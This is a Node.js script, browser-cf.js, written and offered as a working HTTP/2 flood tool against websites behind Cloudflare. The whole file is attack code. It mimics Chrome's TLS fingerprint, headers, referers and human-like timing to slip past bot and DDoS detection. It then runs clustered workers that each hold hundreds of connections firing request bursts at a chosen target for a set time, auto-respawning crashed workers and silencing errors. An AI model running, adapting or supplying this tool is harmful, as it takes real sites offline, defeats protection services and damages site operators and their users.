// browser-cf.js — Cloudflare HTTP/2 Flood (No UAM / No CAPTCHA)
// For targets protected by Cloudflare WAF/DDoS rules but WITHOUT Under Attack Mode
// Usage: node browser-cf <target> <time> <rate> <threads>
// Example: node browser-cf https://target.com 60 64 4

"use strict";

const http2   = require("http2");
const tls     = require("tls");
const cluster = require("cluster");
const url     = require("url");
const crypto  = require("crypto");
const EventEmitter = require("events");

EventEmitter.defaultMaxListeners = 0;

const MAX_STREAMS_PER_WORKER = 256;

// ─── Chrome 133 TLS Cipher Suite (JA3 fingerprint match) ──────────────────────
const CIPHERS = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-SHA",
    "ECDHE-RSA-AES256-SHA",
    "AES128-GCM-SHA256",
    "AES256-GCM-SHA384",
    "AES128-SHA",
    "AES256-SHA"
].join(":");

// ─── Chrome 133 Signature Algorithms ──────────────────────────────────────────
const SIGALGS = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
].join(":");

// ─── Static Chrome User-Agent Pool ────────────────────────────────────────────
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
];

// ─── Randomizer helpers ─────────────────────────────────────────────────────
const pick        = arr => arr[Math.floor(Math.random() * arr.length)];
const randInt     = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

const LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.8,de;q=0.7",
    "en-US,en;q=0.9,fr;q=0.8",
    "en-GB,en;q=0.8,es;q=0.7"
];

const FETCH_SITES = ["none", "same-origin", "cross-site"];

// ─── Validate args ─────────────────────────────────────────────────────────────
if (process.argv.length < 6) {
    console.log("\x1b[31m===[ BROWSER-CF | Cloudflare No-UAM Flood ]===\x1b[0m");
    console.log("\x1b[31mUsage  : node browser-cf <target> <time> <rate> <threads>\x1b[0m");
    console.log("\x1b[33mExample: node browser-cf https://target.com 60 64 4\x1b[0m");
    process.exit(1);
}

const args = {
    target : process.argv[2],
    time   : parseInt(process.argv[3]),
    rate   : parseInt(process.argv[4]),
    threads: parseInt(process.argv[5])
};

let consecutive429 = 0;

// ─── Build a realistic Chrome header set per request ─────────────────────────
function buildHeaders(parsed, userAgent) {
    const chromeVerMatch = userAgent.match(/Chrome\/([\d.]+)/);
    const fullVer  = chromeVerMatch ? chromeVerMatch[1] : "133.0.0.0";
    const majorVer = fullVer.split(".")[0];

    // Platform detection from UA string
    let platform = "\"Windows\"", platformVer = "\"15.0.0\"";
    if (userAgent.includes("Macintosh")) { platform = "\"macOS\""; platformVer = "\"14.0.0\""; }
    if (userAgent.includes("X11"))       { platform = "\"Linux\""; platformVer = "\"\""; }

    const referers = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://duckduckgo.com/",
        args.target,
        `https://duckduckgo.com/?q=${encodeURIComponent(parsed.hostname)}`
    ];

    const hdrs = {
        ":method"                 : "GET",
        ":authority"              : parsed.host,
        ":scheme"                 : "https",
        ":path"                   : parsed.path || "/",
        "sec-ch-ua"               : `"Not(A:Brand";v="99", "Google Chrome";v="${majorVer}", "Chromium";v="${majorVer}"`,
        "sec-ch-ua-mobile"        : "?0",
        "sec-ch-ua-platform"      : platform,
        "sec-ch-ua-platform-version": platformVer,
        "sec-ch-ua-arch"          : "\"x86\"",
        "sec-ch-ua-bitness"       : "\"64\"",
        "sec-ch-ua-model"         : "\"\"",
        "sec-ch-ua-full-version-list": `"Not(A:Brand";v="99.0.0.0", "Google Chrome";v="${fullVer}", "Chromium";v="${fullVer}"`,
        "upgrade-insecure-requests": "1",
        "user-agent"              : userAgent,
        "accept"                  : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site"          : pick(FETCH_SITES),
        "sec-fetch-mode"          : "navigate",
        "sec-fetch-user"          : "?1",
        "sec-fetch-dest"          : "document",
        "referer"                 : pick(referers),
        "accept-encoding"         : "gzip, deflate, br, zstd",
        "accept-language"         : pick(LANGS),
        "priority"                : "u=0, i",
        "pragma"                  : "no-cache",
        "cache-control"           : "no-cache",
        "te"                      : "trailers"
    };
    return hdrs;
}

// ─── Single connection flood loop ──────────────────────────────────────────────
function flood() {
    try {
        const parsed    = url.parse(args.target);
        const host      = parsed.hostname || parsed.host;
        const userAgent = pick(USER_AGENTS);

        // ── TLS handshake — Chrome 133 fingerprint ──────────────────────────
        const tlsSocket = tls.connect({
            host,
            port              : 443,
            servername        : host,
            minVersion        : "TLSv1.2",
            maxVersion        : "TLSv1.3",
            ALPNProtocols     : ["h2", "http/1.1"],
            ciphers           : CIPHERS,
            sigalgs           : SIGALGS,
            ecdhCurve         : "X25519:P-256:P-384:P-521",
            secureOptions     :
                crypto.constants.SSL_OP_NO_RENEGOTIATION |
                crypto.constants.SSL_OP_NO_COMPRESSION   |
                crypto.constants.SSL_OP_NO_SSLv2         |
                crypto.constants.SSL_OP_NO_SSLv3         |
                crypto.constants.SSL_OP_NO_TLSv1         |
                crypto.constants.SSL_OP_NO_TLSv1_1,
            rejectUnauthorized: false
        });

        tlsSocket.on("error", () => {
            global.failedRequests = (global.failedRequests || 0) + 1;
            global.totalRequests  = (global.totalRequests  || 0) + 1;
            if (!tlsSocket.destroyed) tlsSocket.destroy();
            setTimeout(flood, randInt(300, 1200));
        });

        // ── HTTP/2 session ──────────────────────────────────────────────────
        const client = http2.connect(parsed.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize     : 65536,
                enablePush          : false,
                initialWindowSize   : 6291456,
                maxConcurrentStreams : 1000,
                maxFrameSize        : 16384,
                maxHeaderListSize   : 262144
            }
        });

        client.on("connect", () => {
            // Recursive burst with random human-like gap
            function sendBurst() {
                if (client.destroyed || client.closed) return;

                for (let i = 0; i < args.rate; i++) {
                    const req = client.request(buildHeaders(parsed, userAgent));

                    req.on("response", (res) => {
                        global.successRequests = (global.successRequests || 0) + 1;
                        global.totalRequests   = (global.totalRequests   || 0) + 1;

                        const status = res[":status"];
                        if (status === 429 || status === 503) {
                            consecutive429++;
                            client.close();
                        }
                    });

                    req.on("error", () => {
                        global.failedRequests = (global.failedRequests || 0) + 1;
                        global.totalRequests  = (global.totalRequests  || 0) + 1;
                    });

                    req.end();
                }

                // ── Asymmetric human-like inter-burst timing ────────────────
                // Bimodal distribution:  short delay = fast tab switching,
                //                        long  delay = reading page content
                const delay = Math.random() < 0.6
                    ? randInt(300, 900)    // 60 % — quick navigation
                    : randInt(1200, 3000); // 40 % — reading / idle
                setTimeout(sendBurst, delay);
            }
            sendBurst();
        });

        client.on("close", () => {
            if (!client.destroyed) client.destroy();
            setTimeout(flood, randInt(300, 1200));
        });

        client.on("error", () => {
            global.failedRequests = (global.failedRequests || 0) + 1;
            global.totalRequests  = (global.totalRequests  || 0) + 1;
            if (!client.destroyed) client.destroy();
            setTimeout(flood, randInt(300, 1200));
        });

        client.setTimeout(20000, () => {
            if (!client.destroyed) client.destroy();
        });

    } catch (err) {
        setTimeout(flood, 1000);
    }
}

// ─── Stats display ─────────────────────────────────────────────────────────────
function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    console.clear();
    console.log("\x1b[31m===[ BROWSER-CF | Cloudflare No-UAM Flood ]===\x1b[0m");
    console.log("\x1b[36mTarget  :\x1b[0m " + args.target);
    console.log("\x1b[36mTime    :\x1b[0m " + elapsed + "s / " + args.time + "s");
    console.log("\x1b[36mRate    :\x1b[0m " + args.rate + " req/burst × " + args.threads + " workers");
    console.log("\x1b[36mTotal   :\x1b[0m " + (global.totalRequests   || 0) +
        " | \x1b[32mOK:\x1b[0m "  + (global.successRequests || 0) +
        " | \x1b[31mErr:\x1b[0m " + (global.failedRequests  || 0));
    console.log("\x1b[33m429/503 :\x1b[0m " + consecutive429);
}

// ─── Globals ───────────────────────────────────────────────────────────────────
global.totalRequests   = 0;
global.successRequests = 0;
global.failedRequests  = 0;
global.startTime       = Date.now();

// ─── Cluster entry points ──────────────────────────────────────────────────────
if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35m===[ BROWSER-CF | CF No-UAM Mode ]===\x1b[0m");
    console.log("\x1b[36mTarget  :\x1b[0m " + args.target);
    console.log("\x1b[36mTime    :\x1b[0m " + args.time + "s");
    console.log("\x1b[36mRate    :\x1b[0m " + args.rate);
    console.log("\x1b[36mWorkers :\x1b[0m " + args.threads);
    console.log("\x1b[33mNo Puppeteer — direct H2 flood with Chrome fingerprint\x1b[0m\n");

    global.startTime = Date.now();

    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    const statsInterval = setInterval(() => {
        // Aggregate stats from workers
        displayStats();
    }, 1000);

    cluster.on("message", (worker, message) => {
        if (message.type === "stats") {
            global.totalRequests   += message.total   || 0;
            global.successRequests += message.success || 0;
            global.failedRequests  += message.failed  || 0;
        }
    });

    cluster.on("exit", (worker) => {
        cluster.fork(); // auto-respawn crashed worker
    });

    setTimeout(() => {
        clearInterval(statsInterval);
        displayStats();
        console.log("\n\x1b[32mCompleted.\x1b[0m");
        process.exit(0);
    }, args.time * 1000);

} else {
    // Worker: spawn MAX_STREAMS_PER_WORKER connections, staggered 50ms apart
    for (let i = 0; i < MAX_STREAMS_PER_WORKER; i++) {
        setTimeout(flood, i * 50);
    }

    // Report stats back to master every second, then reset local counters
    setInterval(() => {
        process.send({
            type   : "stats",
            total  : global.totalRequests   || 0,
            success: global.successRequests || 0,
            failed : global.failedRequests  || 0
        });
        global.totalRequests   = 0;
        global.successRequests = 0;
        global.failedRequests  = 0;
    }, 1000);
}

process.on("uncaughtException",  () => {});
process.on("unhandledRejection", () => {});
